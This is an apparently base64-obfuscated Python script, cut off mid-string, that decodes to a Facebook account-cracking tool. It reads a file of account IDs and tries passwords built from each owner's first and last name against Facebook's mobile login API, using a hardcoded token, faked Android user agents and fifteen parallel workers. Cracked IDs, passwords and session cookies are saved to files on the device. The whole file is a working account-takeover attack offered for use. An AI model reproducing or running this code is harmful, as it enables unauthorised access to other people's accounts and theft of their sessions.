import base64
exec(base64.b64decode("Iw0KaW1wb3J0IG9zLHpsaWINCg0KZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIG9zUlVCDQpmcm9tIG9zIGltcG9ydCBzeXN0ZW0gYXMgY21kDQpvcy5zeXN0ZW0oJ2NsZWFyJykNCnByaW50KCdsb2FkaW5nIE1vZHVsZXMgLi4uXG4nKQ0KDQoNCg0KdHJ5Og0KICAgIGltcG9ydCByZXF1ZXN0cyANCmV4Y2VwdCBJbXBvcnRFcnJvcjoNCiAgICBwcmludCgnXG4gIGluc3RhbGxpbmcgUmVxdWVzdHMgLi4uXG4nKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgcmVxdWVzdHMnKQ0KDQoNCnRyeToNCiAgICBpbXBvcnQgY29uY3VycmVudC5mdXR1cmVzDQpleGNlcHQgSW1wb3J0RXJyb3I6DQogICAgcHJpbnQoJ1xuICBpbnN0YWxsaW5nIGZ1dHVyZXMgLi4uXG4nKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgZnV0dXJlcycpDQoNCnRyeToNCiAgICBpbXBvcnQgbWVjaGFuaXplDQpleGNlcHQgTW9kdWxlTm90Rm91bmRFcnJvcjoNCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIG1lY2hhbml6ZSA+IC9kZXYvbnVsbCcpDQoNCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4NCmltcG9ydCBvcywgcmVxdWVzdHMsIHJlLHBsYXRmb3JtLCBzeXMsIHJhbmRvbSwgc3VicHJvY2VzcywgdGhyZWFkaW5nLCBpdGVydG9vbHMsYmFzZTY0LHV1aWQsemxpYixyZSxqc29uLHV1aWQsc3VicHJvY2VzcyxzaHV0aWwsd2ViYnJvd3Nlcix0aW1lLGpzb24sc3lzLHJhbmRvbSxkYXRldGltZSx0aW1lLHJlLHN1YnByb2Nlc3MscGxhdGZvcm0sc3RyaW5nLGpzb24sdGltZSxyZSxyYW5kb20sc3lzLHN0cmluZyx1dWlkDQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIHNhcmZyYXpzc2INCmZyb20gc3RyaW5nIGltcG9ydCAqIA0KZnJvbSByYW5kb20gaW1wb3J0IHJhbmRpbnQNCmZyb20gdGltZSBpbXBvcnQgc2xlZXAgYXMgc2xwDQpmcm9tIG9zIGltcG9ydCBzeXN0ZW0gYXMgY21kDQpmcm9tIHpsaWIgaW1wb3J0IGRlY29tcHJlc3MgDQppbXBvcnQgb3MsIHBsYXRmb3JtDQoNCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3INCmZhc3Rfd29yayA9IFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0xNSkuc3VibWl0DQoNCm1vZGVsMiA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Ob3gtTmF2ZWQvMDU4OGFjYjJiNzc5MzIwNDhhMjUxZDUwYTk3MzAyOWIvcmF3L2Y2ZGUwMWFjNjg0MTMxYjUzNTM4NTRlZTExNDg4MGZiMDAyMjdjZWUvTW9kZWw2MCcpLnRleHQuc3BsaXRsaW5lcygpDQp0b3RhbGRtcCA9IDANCmNvdW50ID0gMA0KbG9vcCA9IDANCm9rcyA9IFtdDQpjcHMgPSBbXQ0KaWQgPSBbXQ0KcHMgPSBbXQ0Kc2lkID0gW10NCnRvdGFsPVtdDQptZXRob2RzID0gW10NCnNyYW5nZSA9IDANCnNhdmVkID0gW10NCnRvdGFsZG1wID0gMA0KZmlsdGVyID0gW10NCmRlZiByYW5kQnVpbGRMU0IoKToNCiAgICB2Y2hyb21lID0gc3RyKHJhbmRvbS5yYW5kaW50KDEwMCw5MjUpKSsiLjAuMC4iK3N0cihyYW5kb20ucmFuZGludCgxLDgpKSsiLiIrc3RyKHJhbmRvbS5yYW5kaW50KDQwLDE1MCkpDQogICAgVkFQUCA9IHJhbmRvbS5yYW5kaW50KDQxMDAwMDAwMCw0OTk5OTk5OTkpDQogICAgRU5EID0gJ1tGQkFOL0ZCNEE7RkJBVi8zNzQuMC4wLjIwLjEwOTtGQkJWLzM4MTQ2MjIwMDtGQkRNL3tkZW5zaXR5PTIuMCx3aWR0aD03MjAsaGVpZ2h0PTE0NTZ9O0ZCTEMvZW5fVVM7RkJSVi8zODIwODM5MzU7RkJDUi8xMDEwO0ZCTUYvR3JlZW47RkJCRC9HcmVlbjtGQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9HUkVFTiAyMDIwO0ZCU1YvMTE7RkJPUC8xO0ZCQ0EvYXJtNjQtdjhhOjtdJw0KICAgIHVhID0gZidEYWx2aWsvMi4xLjAgKExpbnV4OyBVOyBBbmRyb2lkIHtyYW5kb20ucmFuZGludCg0LDEzKX07IHtyYW5kb20uY2hvaWNlKG1vZGVsMil9IEJ1aWxkL1FQMUEue3JhbmRvbS5yYW5kaW50KDExMTExMSw5OTk5OTkpfS57cmFuZG9tLnJhbmRpbnQoMTExLDk5OSl9KSAnK0VORA0KICAgIHJldHVybiB1YQ0KDQpkZWYgcmFuZEJ1aWxkdnNza2ooKToNCiAgICBFTkQgPSAnW0ZCQU4vRU1BO0ZCQlYvMzUyMjIzNjgzO0ZCQVYvMjkxLjAuMC4xMi4xMTA7RkJEVi9TTS1HOTM1RkQ7RkJMQy9lbl9HQjtGQk5HL1dJRkk7RkJNTlQvTk9UX01FVEVSRUQ7RkJETS97ZGVuc2l0eT0xLjAxMjV9XScNCiAgICB1YSA9IGYnRGFsdmlrLzIuMS4wIChMaW51eDsgVTsgQW5kcm9pZCB7cmFuZG9tLnJhbmRpbnQoNCwxMyl9OyB7cmFuZG9tLmNob2ljZShtb2RlbDIpfSBCdWlsZC9RUDFBLntyYW5kb20ucmFuZGludCgxMTExMTEsOTk5OTk5KX0ue3JhbmRvbS5yYW5kaW50KDExMSw5OTkpfSkgJytFTkQNCiAgICByZXR1cm4gdWENCg0KDQoNCnN5cy5zdGRvdXQud3JpdGUoJ1x4MWJdMjsgREFSS1dPTEZceDA3JykNClMgPSAnXDAzM1sxOzM3bScNCkEgPSAnXHgxYlszODs1OzIwOG0nDQpSID0gJ1x4MWJbMzg7NTs0Nm0nDQpGID0gJ1x4MWJbMzg7NTs0OG0nDQpaID0gJ1wwMzNbMTszM20nDQpoZWFkID0geydIb3N0JzogJ2Fkc21hbmFnZXIuZmFjZWJvb2suY29tJywgJ3NlYy1jaC11YSc6ICciQ2hyb21pdW0iO3Y9IjEwNyIsICJOb3Q9QT9CcmFuZCI7dj0iMjQiJywgJ3ZpZXdwb3J0LXdpZHRoJzogJzk4MCd9DQpsb2dvID0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiIiIgICAgICAgICAgICANClwwMzNbMTszMW0gICAg4paI4paI4paI4pWX4paR4paR4paI4paI4pWX4paR4paR4paR4paR4paR4paR4paR4paI4paI4paI4paI4paI4paI4pWX4paR4paR4paR4paR4paR4paR4paI4paI4paI4paI4paI4paI4pWX4paRDQpcMDMzWzE7MzJtICAgIOKWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKVkeKWkeKWkeKWkeKWkeKWkeKWkeKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWkeKWkeKWkeKWkeKWkeKWkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVlw0KXDAzM1sxOzMzbSAgICDilojilojilZTilojilojilZfilojilojilZHilojilojilojilojilojilZfilZrilojilojilojilojilojilZfilpHilojilojilojilojilojilZfilojilojilojilojilojilojilZTilZ0NClwwMzNbMTszNG0gICAg4paI4paI4pWR4pWa4paI4paI4paI4paI4pWR4pWa4pWQ4pWQ4pWQ4pWQ4pWd4paR4pWa4pWQ4pWQ4pWQ4paI4paI4pWX4pWa4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4paI4paI4pWXDQpcMDMzWzE7MzVtICAgIOKWiOKWiOKVkeKWkeKVmuKWiOKWiOKWiOKVkeKWkeKWkeKWkeKWkeKWkeKWkeKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWkeKWkeKWkeKWkeKWkeKWkeKWiOKWiOKVkeKWkeKWkeKWiOKWiOKVkQ0KXDAzM1sxOzM2bSAgICDilZrilZDilZ3ilpHilpHilZrilZDilZDilZ3ilpHilpHilpHilpHilpHilpHilZrilZDilZDilZDilZDilZDilZ3ilpHilpHilpHilpHilpHilpHilpHilZrilZDilZ3ilpHilpHilZrilZDilZ0NClwwMzNbMTszN20tPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KXDAzM1sxOzM1bSBPd25lciAgIDogICAgICAgICAgICBEQVJLV09MRiANClwwMzNbMTszNG0gRmFjZWJvb2s6ICAgICAgICAgICAgUkFCSU4NClwwMzNbMTszNm0gR2l0aHViICA6ICAgICAgICAgICAgRGFya3dvbGZyYWJpbg0KXDAzM1sxOzMzbSBWZXJzaW9uIDogICAgICAgICAgICAxOS44DQpcMDMzWzE7MzNtLiAgU0lNUExFIEZJTEUgQ1JBQ0sgVE9PTCDwn5SlDQpcMDMzWzE7MzdtLT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iIiINCmRlZiBjbGVhcigpOg0KICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgIHByaW50KGxvZ28pICAgIA0KICAgIA0KZGVmIHJlc3VsdChPS3MsY3BzKToNCiAgICBpZiBsZW4oT0tzKSAhPSAwIG9yIGxlbihjcHMpICE9IDA6DQogICAgICAgIHByaW50KCdcbicpDQogICAgICAgIHByaW50KDQ3KictJykNCiAgICAgICAgcHJpbnQoJyBUaGUgUHJvY2VzcyBoYXMgYmVlbiBDb21wbGV0ZS4uLicpDQogICAgICAgIHByaW50KCcgVE9UQUwgT0s6ICVzJyAlIHN0cihsZW4ob2tzKSkpDQogICAgICAgIHByaW50KCcgVE9UQUwgQ1A6ICVzJyAlIHN0cihsZW4oY3BzKSkpDQogICAgICAgIHByaW50KDQ3KictJykNCiAgICAgICAgaW5wdXQoIlByZXNzIGVudGVyIHRvIGJhY2sgREFSS1dPTEYgTWVudSAiKQ0KICAgICAgICBleGl0KCkNCiAgIA0KZGVmIHNhcmZyYXooKTogICANCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICBwcmludChsb2dvKQ0KICAgIHByaW50KGYnWzFdIEZJTEUgQ1JBQ0sgJykNCiAgICBwcmludChmJ1syXSBGSUxFIENSRUFURScpDQogICAgcHJpbnQoZidbM10gTE9HT1VUICcpDQogICAgcHJpbnQoZidbNF0gQ09OVEFDVCBPV05FUicpDQogICAgcHJpbnQoZictPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PScpDQogICAgcHJpbnQoJycpDQogICAgc2VsZWN0ID0gaW5wdXQoJ1NlbGVjdCBNZW51PjogJykNCiAgICBpZiBzZWxlY3QgPT0nMSc6DQogICAgICAgIG1ldGhvZF9jcmFjaygpDQogICAgZWxpZiBzZWxlY3QgPT0nMic6DQogICAgCW9zLnN5c3RlbSgncHl0aG9uIGR1bXAtaWQtZW5jLnB5JykNCiAgICBlbGlmIHNlbGVjdCA9PSczJzoNCiAgICAJbG9nb3V0KCkNCiAgICBlbGlmIHNlbGVjdCA9PSc0JzoNCiAgICAJb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcHJvZmlsZS5waHA/aWQ9MTAwMDY0MDM4ODc4NzUwJykNCiAgICBlbHNlOg0KICAgICAgICBwcmludCgnXG4gIENIT09TRSBWQUxJRCBPUFRJT05TIPCflKogLi4uICcpDQogICAgICAgIHRpbWUuc2xlZXAoMikNCiAgICAgICAgU1NCKGFsbGtleSkNCmRlZiBtZXRob2RfY3JhY2soKToNCiAgICBnbG9iYWwgbWV0aG9kcw0KICAgIGNsZWFyKCkNCiAgICBwcmludChmJ1sxXSBNZXRob2QgezF9JykNCiAgICBwcmludChmJ1syXSBNZXRob2QgezJ9JykNCiAgICBwcmludChmJ1szXSBNZXRob2QgezN9JykNCiAgICAjcHJpbnQoZidbNF0gTWV0aG9kIHs0fScpDQogICAgcHJpbnQoZidbMF0gQmFjaycpDQogICAgcHJpbnQoJycpDQogICAgb3B0aW9uID0gaW5wdXQoJ1NlbGVjdCBtZXRob2Q+OiAnKQ0KICAgIGlmIG9wdGlvbiA9PScxJzoNCiAgICAgICAgbWV0aG9kcy5hcHBlbmQoJ21ldGhvZEEnKQ0KICAgICAgICBtYWluX2NyYWNrKCkuY3JhY2soaWQpDQogICAgZWxpZiBvcHRpb24gPT0nMic6DQogICAgICAgIG1ldGhvZHMuYXBwZW5kKCdtZXRob2RCJykNCiAgICAgICAgbWFpbl9jcmFjaygpLmNyYWNrKGlkKQ0KICAgIGVsaWYgb3B0aW9uID09JzMnOg0KICAgICAgICBtZXRob2RzLmFwcGVuZCgnbWV0aG9kQycpDQogICAgICAgIG1haW5fY3JhY2soKS5jcmFjayhpZCkNCiAgICMgZWxpZiBvcHRpb24gPT0nNCc6DQogICAgIyAgICBtZXRob2RzLmFwcGVuZCgnbWV0aG9kRCcpDQogICAjICAgICBtYWluX2NyYWNrKCkuY3JhY2soaWQpDQogICAgZWxpZiBvcHRpb24gPT0nMCc6DQogICAgICAgIHNhcmZyYXooKQ0KICAgIGVsc2U6DQogICAgICBwcmludCgnXG4gU2VsZWN0IFZhbGlkIE9wdGlvbiAuLi4nKQ0KICAgICAgdGltZS5zbGVlcCgyKQ0KICAgICAgbWV0aG9kX2NyYWNrKCkNCg0KY2xhc3MgbWFpbl9jcmFjaygpOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmKToNCiAgICAgICAgc2VsZi5pZD1bXQ0KICAgIGRlZiBjcmFjayhzZWxmLGlkKToNCiAgICAgICAgZ2xvYmFsIG1ldGhvZHMNCiAgICAgICAgY2xlYXIoKQ0KICAgICAgICBzZWxmLmZpbGUgPSBpbnB1dCgnUHV0IEZpbGUgTmFtZSA6ICcpDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIHNlbGYuaWQgPSBvcGVuKHNlbGYuZmlsZSkucmVhZCgpLnNwbGl0bGluZXMoKQ0KICAgICAgICAgICAgc2VsZi5wYXN3KCkNCiAgICAgICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOg0KICAgICAgICAgICAgcHJpbnQoJ09wcHMgRmlsZSBOb3QgRm91bmQgLi4uJykNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMikNCiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICAgICAgcHJpbnQobG9nbykNCiAgICAgICAgICAgIHByaW50KCdUcnkgQWdhaW4gLi4uJykNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMikNCiAgICAgICAgICAgIG1haW5fY3JhY2soKS5jcmFjayhpZCkNCiAgICAgICAgICAgIA0KICAgIGRlZiBtZXRob2RBKHNlbGYsIHNpZCwgbmFtZSwgcHN3KToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgZ2xvYmFsIG9rcyxjcHMsbG9vcA0KICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmIlxyIHtTfVtEVy1YRF0ge2xvb3B9IHwgTTEgT0svQ1Age2xlbihva3MpfS97bGVuKGNwcyl9IHwge1N9eyd7Oi4wJX0nLmZvcm1hdChsb29wL2Zsb2F0KGxlbihzZWxmLmlkKSkpfXtTfSIpDQogICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgICAgIGZzID0gbmFtZS5zcGxpdCgnICcpWzBdDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgbHMgPSBuYW1lLnNwbGl0KCcgJylbMV0NCiAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICBscyA9IGZzDQogICAgICAgICAgICBmb3IgcHcgaW4gcHN3Og0KICAgICAgICAgICAgICAgIHBzID0gcHcucmVwbGFjZSgnZmlyc3QnLGZzLmxvd2VyKCkpLnJlcGxhY2UoJ0ZpcnN0JyxmcykucmVwbGFjZSgnbGFzdCcsbHMubG93ZXIoKSkucmVwbGFjZSgnTGFzdCcsbHMpLnJlcGxhY2UoJ05hbWUnLG5hbWUpLnJlcGxhY2UoJ25hbWUnLG5hbWUubG93ZXIoKSkNCiAgICAgICAgICAgICAgICB3aXRoIHJlcXVlc3RzLlNlc3Npb24oKSBhcyBzZXNzaW9uOg0KICAgICAgICAgICAgICAgICAgICBkYXRhID0geyJhZGlkIjogc3RyKHV1aWQudXVpZDQoKSksDQoiZm9ybWF0IjogImpzb24iLA0KImRldmljZV9pZCI6IHN0cih1dWlkLnV1aWQ0KCkpLA0KImNwbCI6ICJ0cnVlIiwNCiJmYW1pbHlfZGV2aWNlX2lkIjogc3RyKHV1aWQudXVpZDQoKSksDQoiY3JlZGVudGlhbHNfdHlwZSI6ICJkZXZpY2VfYmFzZWRfbG9naW5fcGFzc3dvcmQiLA0KImVycm9yX2RldGFpbF90eXBlIjogImJ1dHRvbl93aXRoX2Rpc2FibGVkIiwNCiJzb3VyY2UiOiAiZGV2aWNlX2Jhc2VkX2xvZ2luIiwNCiJlbWFpbCI6IHNpZCwNCiJwYXNzd29yZCI6IHBzLA0KImFjY2Vzc190b2tlbiI6ICIzNTA2ODU1MzE3MjglN0M2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMiIsDQoiZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzIjogIjEiLA0KIm1ldGFfaW5mX2ZibWV0YSI6ICIiLA0KImFkdmVydGlzZXJfaWQiOiBzdHIodXVpZC51dWlkNCgpKSwNCiJjdXJyZW50bHlfbG9nZ2VkX2luX3VzZXJpZCI6ICIwIiwNCiJsb2NhbGUiOiAiZW5fR0IiLA0KImNsaWVudF9jb3VudHJ5X2NvZGUiOiAiR0IiLA0KIm1ldGhvZCI6ICJhdXRoLmxvZ2luIiwNCiJmYl9hcGlfcmVxX2ZyaWVuZGx5X25hbWUiOiAiYXV0aGVudGljYXRlIiwNCiJmYl9hcGlfY2FsbGVyX2NsYXNzIjogImNvbS5mYWNlYm9vay5hY2NvdW50LmxvZ2luLnByb3RvY29sLkZiNGFBdXRoSGFuZGxlciIsDQoiYXBpX2tleSI6ICI4ODJhODQ5MDM2MWRhOTg3MDJiZjk3YTAyMWRkYzE0ZCJ9DQogICAgICAgICAgICAgICAgaGVhZGVycyA9IHsnVXNlci1BZ2VudCc6IHJhbmRCdWlsZHZzc2tqKCksDQonQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsDQonSG9zdCc6ICdncmFwaC5mYWNlYm9vay5jb20nLA0KJ1gtRkItTmV0LUhOSSc6IHN0cihyYW5kb20ucmFuZGludCgyMDAwMCwgNDAwMDApKSwNCidYLUZCLVNJTS1ITkknOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAsIDQwMDAwKSksDQonWC1GQi1Db25uZWN0aW9uLVR5cGUnOiAnTU9CSUxFLkxURScsDQonWC1UaWdvbi1Jcy1SZXRyeSc6ICdGYWxzZScsDQoneC1mYi1zZXNzaW9uLWlkJzogJ25pZD1qaVoreU5OQmdid0M7cGlkPU1haW47dGlkPTEzMjtuYz0xO2ZjPTA7YmM9MDtjaWQ9ZDI5ZDY3ZDM3ZWNhMzg3NDgyYThhNWI3NDBmODRmNjInLA0KJ3gtZmItZGV2aWNlLWdyb3VwJzogJzUxMjAnLA0KJ1gtRkItRnJpZW5kbHktTmFtZSc6ICdWaWV3ZXJSZWFjdGlvbnNNdXRhdGlvbicsDQonWC1GQi1SZXF1ZXN0LUFuYWx5dGljcy1UYWdzJzogJ2dyYXBoc2VydmljZScsDQonWC1GQi1IVFRQLUVuZ2luZSc6ICdMaWdlcicsDQonWC1GQi1DbGllbnQtSVAnOiAnVHJ1ZScsDQonWC1GQi1TZXJ2ZXItQ2x1c3Rlcic6ICdUcnVlJywNCid4LWZiLWNvbm5lY3Rpb24tdG9rZW4nOiAnZDI5ZDY3ZDM3ZWNhMzg3NDgyYThhNWI3NDBmODRmNjInLH0NCiAgICAgICAgICAgICAgICBxID0gc2Vzc2lvbi5wb3N0KCJodHRwczovL2ItZ3JhcGguZmFjZWJvb2suY29tL2F1dGgvbG9naW4iLGRhdGE9ZGF0YSwgaGVhZGVycz1oZWFkZXJzLCBhbGxvd19yZWRpcmVjdHM9RmFsc2UpLmpzb24oKQ0KICAgICAgICAgICAgICAgIGlmICdzZXNzaW9uX2tleScgaW4gcToNCiAgICAgICAgICAgICAgICAgICAgY2trayA9ICI7Ii5qb2luKGlbIm5hbWUiXSsiPSIraVsidmFsdWUiXSBmb3IgaSBpbiBxWyJzZXNzaW9uX2Nvb2tpZXMiXSk7c3NiYiA9IGJhc2U2NC5iNjRlbmNvZGUob3MudXJhbmRvbSgxOCkpLmRlY29kZSgpLnJlcGxhY2UoIj0iLCIiKS5yZXBsYWNlKCIrIiwiXyIpLnJlcGxhY2UoIi8iLCItIik7Y29va2llID0gZiJzYj17c3NiYn07e2Nra2t9Ig0KICAgICAgICAgICAgICAgICAgICBwcmludChmIlxye1J9IFtEVy1PS10ge3NpZH0gfCB7cHN9IHtTfSIpDQogICAgICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQoc2lkKQ0KICAgICAgICAgICAgICAgICAgICBvcGVuKCcvc2RjYXJkL0RXX09LX2lkc19NMS50eHQnLCdhJykud3JpdGUoc2lkKyd8JytwcysnXG4nKTtvcGVuKCcvc2RjYXJkL1NTQl9pRHNfQ09PS2lFc19NMS50eHQnLCdhJykud3JpdGUoc2lkKyd8JytwcysnfCcrY29va2llKydcbicpDQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsnZXJyb3InXVsnbWVzc2FnZSddOg0KICAgICAgICAgICAgICAgICAgICAgI3ByaW50KGYiXHJ7QX0gW1NTQi1DUF0ge3NpZH0gfCB7cHN9IHtTfSIpDQogICAgICAgICAgICAgICAgICAgICBjcHMuYXBwZW5kKHNpZCkNCiAgICAgICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQvRFdfQ1AudHh0JywnYScpLndyaXRlKHNpZCsnfCcrcHMrJ1xuJykNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgbG9vcCs9MQ0KICAgICAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgICAgICAgICBzZWxmLm1ldGhvZEEoc2lkLCBuYW1lLCBwcykNCiAgICAgICAgICAgIA0KICAgIGRlZiBtZXRob2RDKHNlbGYsIHNpZCwgbmFtZSwgcHN3KToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgZ2xvYmFsIG9rcyxjcHMsbG9vcA0KICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmIlxyIHtTfVtEVy1YRF0ge2xvb3B9IHwgTTMgT0svQ1Age2xlbihva3MpfS97bGVuKGNwcyl9IHwge1N9eyd7Oi4wJX0nLmZvcm1hdChsb29wL2Zsb2F0KGxlbihzZWxmLmlkKSkpfXtTfSIpDQogICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgICAgIGZzID0gbmFtZS5zcGxpdCgnICcpWzBdDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgbHMgPSBuYW1lLnNwbGl0KCcgJylbMV0NCiAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICBscyA9IGZzDQogICAgICAgICAgICBmb3IgcHcgaW4gcHN3Og0KICAgICAgICAgICAgICAgIHBzID0gcHcucmVwbGFjZSgnZmlyc3QnLGZzLmxvd2VyKCkpLnJlcGxhY2UoJ0ZpcnN0JyxmcykucmVwbGFjZSgnbGFzdCcsbHMubG93ZXIoKSkucmVwbGFjZSgnTGFzdCcsbHMpLnJlcGxhY2UoJ05hbWUnLG5hbWUpLnJlcGxhY2UoJ25hbWUnLG5hbWUubG93ZXIoKSkNCiAgICAgICAgICAgICAgICB3aXRoIHJlcXVlc3RzLlNlc3Npb24oKSBhcyBzZXNzaW9uOg0KICAgICAgICAgICAgICAgICAgICBkYXRhID0geyJhZGlkIjogc3RyKHV1aWQudXVpZDQoKSksDQoiZm9ybWF0IjogImpzb24iLA0KImRldmljZV9pZCI6IHN0cih1dWlkLnV1aWQ0KCkpLA0KImNwbCI6ICJ0cnVlIiwNCiJmYW1pbHlfZGV2aWNlX2lkIjogc3RyKHV1aWQudXVpZDQoKSksDQoiY3JlZGVudGlhbHNfdHlwZSI6ICJkZXZpY2VfYmFzZWRfbG9naW5fcGFzc3dvcmQiLA0KImVycm9yX2RldGFpbF90eXBlIjogImJ1dHRvbl93aXRoX2Rpc2FibGVkIiwNCiJzb3VyY2UiOiAiZGV2aWNlX2Jhc2VkX2xvZ2luIiwNCiJlbWFpbCI6IHNpZCwNCiJwYXNzd29yZCI6IHBzLA0KImFjY2Vzc190b2tlbiI6ICIzNTA2ODU1MzE3MjglN0M2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMiIsDQoiZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzIjogIjEiLA0KIm1ldGFfaW5mX2ZibWV0YSI6ICIiLA0KImFkdmVydGlzZXJfaWQiOiBzdHIodXVpZC51dWlkNCgpKSwNCiJjdXJyZW50bHlfbG9nZ2VkX2luX3VzZXJpZCI6ICIwIiwNCiJsb2NhbGUiOiAiZW5fR0IiLA0KImNsaWVudF9jb3VudHJ5X2NvZGUiOiAiR0IiLA0KIm1ldGhvZCI6ICJhdXRoLmxvZ2luIiwNCiJmYl9hcGlfcmVxX2ZyaWVuZGx5X25hbWUiOiAiYXV0aGVudGljYXRlIiwNCiJmYl9hcGlfY2FsbGVyX2NsYXNzIjogImNvbS5mYWNlYm9vay5hY2NvdW50LmxvZ2luLnByb3RvY29sLkZiNGFBdXRoSGFuZGxlciIsDQoiYXBpX2tleSI6ICI4ODJhODQ5MDM2MWRhOTg3MDJiZjk3YTAyMWRkYzE0ZCJ9DQogICAgICAgICAgICAgICAgaGVhZGVycyA9IHsnVXNlci1BZ2VudCc6IHJhbmRCdWlsZExTQigpLA0KJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLA0KJ0hvc3QnOiAnZ3JhcGguZmFjZWJvb2suY29tJywNCidYLUZCLU5ldC1ITkknOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAsIDQwMDAwKSksDQonWC1GQi1TSU0tSE5JJzogc3RyKHJhbmRvbS5yYW5kaW50KDIwMDAwLCA0MDAwMCkpLA0KJ1gtRkItQ29ubmVjdGlvbi1UeXBlJzogJ01PQklMRS5MVEUnLA0KJ1gtVGlnb24tSXMtUmV0cnknOiAnRmFsc2UnLA0KJ3gtZmItc2Vzc2lvbi1pZCc6ICduaWQ9amlaK3lOTkJnYndDO3BpZD1NYWluO3RpZD0xMzI7bmM9MTtmYz0wO2JjPTA7Y2lkPWQyOWQ2N2QzN2VjYTM4NzQ4MmE4YTViNzQwZjg0ZjYyJywNCid4LWZiLWRldmljZS1ncm91cCc6ICc1MTIwJywNCidYLUZCLUZyaWVuZGx5LU5hbWUnOiAnVmlld2VyUmVhY3Rpb25zTXV0YXRpb24nLA0KJ1gtRkItUmVxdWVzdC1BbmFseXRpY3MtVGFncyc6ICdncmFwaHNlcnZpY2UnLA0KJ1gtRkItSFRUUC1FbmdpbmUnOiAnTGlnZXInLA0KJ1gtRkItQ2xpZW50LUlQJzogJ1RydWUnLA0KJ1gtRkItU2VydmVyLUNsdXN0ZXInOiAnVHJ1ZScsDQoneC1mYi1jb25uZWN0aW9uLXRva2VuJzogJ2QyOWQ2N2QzN2VjYTM4NzQ4MmE4YTViNzQwZjg0ZjYyJyx9DQogICAgICAgICAgICAgICAgcSA9IHNlc3Npb24ucG9zdCgiaHR0cHM6Ly9iLWdyYXBoLmZhY2Vib29rLmNvbS9hdXRoL2xvZ2luIixkYXRhPWRhdGEsIGhlYWRlcnM9aGVhZGVycywgYWxsb3dfcmVkaXJlY3RzPUZhbHNlKS5qc29uKCkNCiAgICAgICAgICAgICAgICBpZiAnc2Vzc2lvbl9rZXknIGluIHE6DQogICAgICAgICAgICAgICAgICAgIGNra2sgPSAiOyIuam9pbihpWyJuYW1lIl0rIj0iK2lbInZhbHVlIl0gZm9yIGkgaW4gcVsic2Vzc2lvbl9jb29raWVzIl0pO3NzYmIgPSBiYXNlNjQuYjY0ZW5jb2RlKG9zLnVyYW5kb20oMTgpKS5kZWNvZGUoKS5yZXBsYWNlKCI9IiwiIikucmVwbGFjZSgiKyIsIl8iKS5yZXBsYWNlKCIvIiwiLSIpO2Nvb2tpZSA9IGYic2I9e3NzYmJ9O3tja2trfSINCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJccntSfSBbRFctT0tdIHtzaWR9IHwge3BzfSB7U30iKQ0KICAgICAgICAgICAgICAgICAgICBva3MuYXBwZW5kKHNpZ